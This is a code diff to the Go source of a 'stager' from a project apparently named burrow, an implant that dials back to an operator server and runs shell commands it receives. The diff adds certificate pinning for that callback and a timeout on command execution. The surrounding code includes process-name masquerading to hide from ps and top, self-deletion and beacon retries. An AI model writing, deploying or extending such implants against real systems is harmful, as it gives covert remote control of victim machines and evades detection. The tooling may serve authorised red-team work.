@@ -10,9 +10,12 @@
 //
 // With embedded config:
 //
+// With embedded config:
+//
 //	go build -ldflags="-s -w \
 //	  -X main.defaultServer=10.0.0.1:11601 \
-//	  -X main.defaultNoTLS=true \
+//	  -X main.defaultNoTLS=false \
+//	  -X main.defaultFingerprint=AB:CD:EF:... \
 //	  -X main.defaultMasq=true" \
 //	  -o stager ./cmd/stager/
 package main
@@ -20,6 +23,7 @@ package main
 import (
 	"context"
 	"crypto/tls"
+	"crypto/x509"
 	"errors"
 	"flag"
 	"fmt"
@@ -36,6 +40,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/loudmumble/burrow/internal/certgen"
 	"github.com/loudmumble/burrow/internal/mux"
 	"github.com/loudmumble/burrow/internal/protocol"
 	"github.com/loudmumble/burrow/internal/relay"
@@ -45,10 +50,11 @@ import (
 //
 //	go build -ldflags="-X main.defaultServer=10.0.0.1:11601 -X main.defaultNoTLS=true"
 var (
-	defaultServer string // e.g. "10.0.0.1:11601" or "s1:11601,s2:11601"
-	defaultNoTLS  string // "true" or "false"
-	defaultMasq   string // "true" to enable process masquerade
-	version       = "3.0.0-stager"
+	defaultServer      string // e.g. "10.0.0.1:11601" or "s1:11601,s2:11601"
+	defaultNoTLS       string // "true" or "false"
+	defaultMasq        string // "true" to enable process masquerade
+	defaultFingerprint string // SHA-256 cert fingerprint for pinning (colon-separated uppercase hex)
+	version            = "3.0.0-stager"
 )
 
 func main() {
@@ -57,11 +63,13 @@ func main() {
 	noTLS := defaultNoTLS == "true"
 	masq := defaultMasq == "true"
 
+	var fingerprint string
 	var selfDelete bool
 	var maxRetries int
 	var beacon time.Duration
 
 	flag.StringVar(&serverFlag, "c", serverFlag, "Server address(es), comma-separated")
+	flag.StringVar(&fingerprint, "fp", defaultFingerprint, "Expected server TLS fingerprint (SHA-256, colon-separated hex)")
 	flag.BoolVar(&noTLS, "no-tls", noTLS, "Disable TLS")
 	flag.BoolVar(&selfDelete, "self-delete", false, "Delete binary after exit")
 	flag.BoolVar(&masq, "masquerade", masq, "Masquerade process name (Linux)")
@@ -97,7 +105,7 @@ func main() {
 
 	for ctx.Err() == nil {
 		addr := servers[serverIdx]
-		conn, err := dialServer(ctx, addr, noTLS)
+		conn, err := dialServer(ctx, addr, noTLS, fingerprint)
 		if err != nil {
 			if ctx.Err() != nil {
 				break
@@ -151,7 +159,7 @@ func main() {
 // Connection
 // -------------------------------------------------------------------
 
-func dialServer(ctx context.Context, addr string, noTLS bool) (net.Conn, error) {
+func dialServer(ctx context.Context, addr string, noTLS bool, fingerprint string) (net.Conn, error) {
 	d := &net.Dialer{Timeout: 10 * time.Second}
 	var conn net.Conn
 	var err error
@@ -159,10 +167,29 @@ func dialServer(ctx context.Context, addr string, noTLS bool) (net.Conn, error) 
 	if noTLS {
 		conn, err = d.DialContext(ctx, "tcp", addr)
 	} else {
-		conn, err = tls.DialWithDialer(d, "tcp", addr, &tls.Config{
-			InsecureSkipVerify: true,
+		tlsCfg := &tls.Config{
 			MinVersion:         tls.VersionTLS12,
-		})
+			InsecureSkipVerify: true,
+		}
+		if fingerprint != "" {
+			expected := strings.ToUpper(strings.TrimSpace(fingerprint))
+			tlsCfg.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+				if len(rawCerts) == 0 {
+					return errors.New("no peer certificates presented")
+				}
+				peerCert, err := x509.ParseCertificate(rawCerts[0])
+				if err != nil {
+					return fmt.Errorf("parse peer certificate: %w", err)
+				}
+				actual := certgen.Fingerprint(peerCert)
+				if actual != expected {
+					return fmt.Errorf("%w: expected %s, got %s",
+						certgen.ErrFingerprintMismatch, expected, actual)
+				}
+				return nil
+			}
+		}
+		conn, err = tls.DialWithDialer(d, "tcp", addr, tlsCfg)
 	}
 	if err != nil {
 		return nil, err
@@ -347,10 +374,26 @@ func execCmd(id, command string, ctrl net.Conn, mu *sync.Mutex) {
 	} else {
 		c = exec.Command("sh", "-c", command)
 	}
-	out, err := c.CombinedOutput()
+	// 60-second timeout matches the full agent.
+	done := make(chan error, 1)
+	var out []byte
+	go func() {
+		var err error
+		out, err = c.CombinedOutput()
+		done <- err
+	}()
+	var execErr error
+	select {
+	case execErr = <-done:
+	case <-time.After(60 * time.Second):
+		if c.Process != nil {
+			c.Process.Kill()
+		}
+		execErr = fmt.Errorf("exec timeout after 60s")
+	}
 	resp.Output = strings.TrimRight(string(out), "\r\n")
-	if err != nil {
-		resp.Error = err.Error()
+	if execErr != nil {
+		resp.Error = execErr.Error()
 	}
 	if m, _ := protocol.EncodeExecResponse(resp); m != nil {
 		mu.Lock()
@@ -514,16 +557,6 @@ func doSelfDelete() {
 // -------------------------------------------------------------------
 
 func masqueradeProcess(name string) {
-	// Overwrite os.Args[0] in-place via copy into the arg's backing bytes.
-	if len(os.Args) > 0 {
-		arg := []byte(os.Args[0])
-		n := copy(arg, name)
-		for i := n; i < len(arg); i++ {
-			arg[i] = 0
-		}
-		os.Args[0] = name
-	}
-
 	// /proc/self/comm controls what ps/top display (max 15 chars).
 	comm := name
 	if len(comm) > 15 {
